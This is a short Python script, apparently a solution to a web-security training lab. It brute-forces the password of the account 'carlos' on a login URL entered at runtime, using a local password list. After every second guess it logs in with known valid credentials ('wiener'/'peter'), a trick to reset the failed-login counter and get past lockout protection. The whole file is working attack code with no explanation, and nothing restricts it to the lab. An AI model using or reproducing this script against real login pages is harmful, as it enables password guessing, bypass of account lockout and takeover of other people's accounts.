import requests 

url = str(input())
def getlist(link):
    with open(link) as f:
        content = f.readlines()
    # you may also want to remove whitespace characters like `\n` at the end of each line
    content_list = [x.strip() for x in content] 
    return content_list
pass_list = getlist('E:\Công việc\python scrpit\pass.txt')
i=0
def payload(url,pass_list,i) :
    for pas in pass_list :
        pload = {'username':'carlos', 'password' : str(pas)}
        rep = requests.post(url,data=pload)
        print(rep.status_code)
        i = i + 1
        if i % 2 == 0 :
            correct()
        else : continue

def correct() :
    pload = {'username' : 'wiener', 'password' : 'peter'}
    rep = requests.post(url,data=pload)
    print(rep.status_code)

payload(url,pass_list,i)
